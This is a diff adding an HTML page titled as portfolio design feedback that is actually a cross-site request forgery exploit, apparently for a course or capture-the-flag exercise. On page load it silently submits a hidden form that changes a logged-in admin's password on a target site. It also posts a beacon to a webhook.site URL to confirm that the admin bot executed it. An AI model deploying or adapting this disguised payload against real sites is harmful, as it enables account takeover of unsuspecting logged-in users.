@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Website design feedback</title></head>
+<body>
+<h1>Thanks for checking out my portfolio!</h1>
+
+<!-- CSRF: the settings form has no CSRF token and the session cookie is SameSite=None -->
+<form id="csrf-form" action="https://cats.is-course.ru/settings" method="POST">
+  <input type="hidden" name="password" value="CsrfPwn!Passw0rd1">
+  <input type="hidden" name="confirm-password" value="CsrfPwn!Passw0rd1">
+</form>
+
+<script>
+  // Beacon so we can see that the admin bot loaded the page and ran JS
+  fetch('https://webhook.site/7bc79735-d316-4c37-874b-e94751dcd9db?stage=csrf-page-loaded', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: 'csrf page loaded'
+  });
+
+  // Submit the forged request as the logged-in admin
+  document.getElementById('csrf-form').submit();
+</script>
+</body>
+</html>
